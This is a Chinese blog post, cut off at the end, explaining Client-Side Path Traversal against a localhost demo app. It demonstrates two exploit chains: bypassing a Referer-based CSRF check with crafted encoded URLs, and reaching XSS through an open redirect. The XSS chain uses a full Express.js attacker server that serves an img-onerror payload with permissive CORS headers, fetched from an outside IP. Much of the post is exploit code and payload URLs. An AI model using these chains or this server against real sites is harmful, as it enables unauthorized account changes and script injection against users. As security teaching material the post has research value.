---
title: CSPT漏洞浅析 - 飘渺红尘✨
url: https://www.cnblogs.com/piaomiaohongchen/p/19148914
source: 博客园 - 飘渺红尘✨
date: 2025-11-02
fetch_date: 2025-11-03T03:15:19.344532
---

# CSPT漏洞浅析 - 飘渺红尘✨

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/piaomiaohongchen/)

# [飘渺红尘](https://www.cnblogs.com/piaomiaohongchen)

## 永远年轻永远热泪盈眶,永远在路上 星光不问赶路人,时光不负有心人

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/piaomiaohongchen/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E9%A3%98%E6%B8%BA%E7%BA%A2%E5%B0%98%E2%9C%A8)
* 订阅
* [管理](https://i.cnblogs.com/)

# [CSPT漏洞浅析](https://www.cnblogs.com/piaomiaohongchen/p/19148914 "发布于 2025-11-02 19:39")

CSPT全称是Client-Side Path Traversal ，即客户端路径遍历。

概念说明

CSPT 全称 Client-Side Path Traversal（客户端路径遍历），是一种针对前端应用的漏洞，核心是攻击者通过篡改 URL 参数、请求参数等，让浏览器（客户端）错误地向非预期的服务器路径发送请求，从而获取本不应访问的数据或资源。

它的本质是 “前端逻辑对参数校验不严格”，区别于传统的 “服务端路径遍历”（攻击目标是服务器文件系统）：

攻击对象：浏览器的请求逻辑（而非服务器）；

核心结果：让浏览器请求到开发者未开放的 API 接口、JSON 数据文件等；

如果配合其他漏洞，可能会触发或绕过达成某些漏洞的利用，多用于chain二次攻击。

跟上我的节奏，让我们揭开这个漏洞的神秘面纱。漏洞基本特征:

浏览器上访问 用户资料页面:

<http://localhost:9999/public/profile.html?id=1>

![image](https://img2024.cnblogs.com/blog/1090320/202511/1090320-20251102193507343-1822346949.png)

除了触发本身的前端页面外，还会触发一个api接口

api接口: http://localhost:9999/api/users/1

response返回:

![image](https://img2024.cnblogs.com/blog/1090320/202511/1090320-20251102193520136-2043014513.png)

api接口会把返回映射返回给前端输出响应。

用一张图总结下此特征:

![image](https://img2024.cnblogs.com/blog/1090320/202511/1090320-20251102193533818-409111216.png)

修改id=123

<http://localhost:9999/public/profile.html?id=123>

![image](https://img2024.cnblogs.com/blog/1090320/202511/1090320-20251102193543342-1042678174.png)

后端会去尝试请求:

http://localhost:9999/api/users/123

那么这里大家发现没有，我们发现api路径上的id可控，即可

[http://localhost:9999/api/users/{可控](http://localhost:9999/api/users/%7B%E5%8F%AF%E6%8E%A7)}

有这个特征，那么我们可以做什么？

输入<http://localhost:9999/public/profile.html?id=../123>

![image](https://img2024.cnblogs.com/blog/1090320/202511/1090320-20251102193554850-1204754077.png)

api会去请求http://localhost:9999/api/123

现在我们通过客户端(前端)的访问，任意控制后端api的路由走向。

单看CSPT漏洞，感觉这种行为没有任何意义。因为我们用户本身就可以访问api接口。

现在我们把CSPT代入到CSRF漏洞

可用业务场景1:

用户访问

<http://localhost:9999/public/profile.html?id=1>

![image](https://img2024.cnblogs.com/blog/1090320/202511/1090320-20251102193609197-435121736.png)

输出用户信息 如id 姓名和头像。

站点内，我们发现了一个get请求的修改用户姓名的接口如下所示:

<http://localhost:9999/api/profile?id=1&name=test>

当我们直接访问他，它存在安全限制，csrf最常见的安全修复方案就是referer限制。

![image](https://img2024.cnblogs.com/blog/1090320/202511/1090320-20251102193623802-1093474749.png)

因为有referer限制，我无法csrf修改用户信息成功。那么此时CSPT漏洞的作用就来了。

已知:

<http://localhost:9999/public/profile.html?id=1>

返回接口:http://localhost:9999/api/users/1

构造可以csrf的CSPT接口:

[http://localhost:9999/public/profile.html?id=](http://localhost:9999/public/profile.html?id=1)../[profile?id=1&name=test](http://localhost:9999/api/profile?id=1&name=test)

因为是客户端漏洞，所以最好有必要对特殊字符串进行url编码下:

[http://localhost:9999/public/profile.html?id=](http://localhost:9999/public/profile.html?id=1)..%2f[profile%3fid%3d1%26name%3dtest](http://localhost:9999/api/profile?id=1&name=test)

使用浏览器再次访问:

![image](https://img2024.cnblogs.com/blog/1090320/202511/1090320-20251102193632920-280044989.png)

此时利用CSPT，我们成功绕过了csrf限制，通过网络数据请求，你能看到他携带了referer。

现在我们刷新我们的id=1的用户页面:

![image](https://img2024.cnblogs.com/blog/1090320/202511/1090320-20251102193642364-1252056137.png)

此时姓名已经被修改掉了，说明csrf成功。比起传统的referer url绕过，使用CSPT更加方便，更加智能。

可用业务场景2:

如果一个网站同时具备CSPT+api接口url跳转漏洞，那么此时我们可以把这个漏洞升级成一个xss漏洞。

那么我们来看看吧，怎么做？

首先是api接口的url跳转:

<http://localhost:9999/redirect?url=https://example.com>

![image](https://img2024.cnblogs.com/blog/1090320/202511/1090320-20251102193653779-1389386938.png)

这个url跳转，无法使用伪协议进行xss攻击。那么他的危害相对就小了，只能钓鱼。

小小的跳转，是如何和无用的CSPT配合的。

让我们回到最开始CSPT的业务现场:

访问<http://localhost:9999/public/profile.html?id=1>

触发api接口:http://localhost:9999/api/users/1

response返回:

{"id": 1, "name": "test", "profilePic": "/public/images/user1.jpg"}

![image](https://img2024.cnblogs.com/blog/1090320/202511/1090320-20251102193707705-385315983.png)

api接口的json信息，会映射到前端页面上:

![image](https://img2024.cnblogs.com/blog/1090320/202511/1090320-20251102193717382-1105575505.png)

现在我们在api接口上发现了一个url跳转漏洞，那么此时思路就来了。我们能不能，有没有可能通过CSPT漏洞，请求api接口实现跳转，在页面上加载恶意的json返回？

这里直接上写好的利用代码:

const express = require('express');

const app = express();

// 配置 CORS 头，允许目标平台（localhost:9999）跨域读取

app.use((req, res, next) => {

console.log('收到请求:', req.method, req.url);

console.log('请求头:', req.headers);

res.setHeader('Access-Control-Allow-Origin', 'http://localhost:9999');

res.setHeader('Access-Control-Allow-Credentials', 'true');

// 不在这里统一设置Content-Type，让每个路由单独设置

res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');

res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

res.setHeader('Access-Control-Max-Age', '86400');

next();

});

// 修改为专门支持CSPT漏洞利用的响应格式

app.get('/xss', (req, res) => {

console.log('处理/xss请求，为CSPT漏洞利用返回JSON格式响应');

res.setHeader('Content-Type', 'application/json');

const maliciousData = {

id: "<img src=\"x\" onerror=\"alert(321)\" />",

name: "hello",

profilePic: "/public/images/default.jpg"

};

console.log('发送JSON格式XSS响应:', JSON.stringify(maliciousData));

res.json(maliciousData);

});

const PORT = 5001;

app.listen(PORT, () => {

console.log(`攻击者服务（XSS 弹窗版）启动：http://localhost:${PORT}`);

});

远程服务器上使用node启动:

![image](https://img2024.cnblogs.com/blog/1090320/202511/1090320-20251102193730394-1685952467.png)

CSPT雏形:

<http://localhost:9999/public/profile.html?id=1> ==>http://localhost:9999/api/users/1

演变:

<http://localhost:9999/public/profile.html?id=../../redirect?url=https://example.com>

==>

<http://localhost:9999/public/profile.html?id=..%2f..%2fredirect%3furl%3dhttps%3a%2f%2fexample.com>

==>

<http://localhost:9999/redirect?url=https://example.com>

==>

[https://example.com](http://localhost:9999/redirect?url=https://example.com)

效果:

![image](https://img2024.cnblogs.com/blog/1090320/202511/1090320-20251102193740589-1872383280.png)

此时你会发现访问example.com的时候报错红色了。

![image](https://img2024.cnblogs.com/blog/1090320/202511/1090320-20251102193756035-1692162433.png)

所以这也解释了为什么利用攻击代码中为什么要设置Access-Control-\*的原因。

万事俱备，直接利用实现xss吧:

<http://localhost:9999/public/profile.html?id=../../redirect?url=http://38.207.176.172:5000/xss>

==>

[http://localhost:9999/public/profile.html?id=..%2F..%2Fredirect%3Furl%3Dhttp%3A%2F%2F38.207.176.172%3a5001%2fxss](http://localhost:9999/public/profile.html?id=..%2F..%2Fredirect%3Furl%3Dhttp%3A%2F%2F38.207.176.172%3a5000%2fxss)

==>

[http://localhost:9999/redirect?url=http://38.207.176.172:5001/xss](http://localhost:9999/redirect?url=http://38.207.176.172:5000/xss)

==>

[http://38.207.176.172:5001/xss](http://localhost:9999/redirect?url=http://38.207.176.172:5000/xss)

编码访问:

[http://...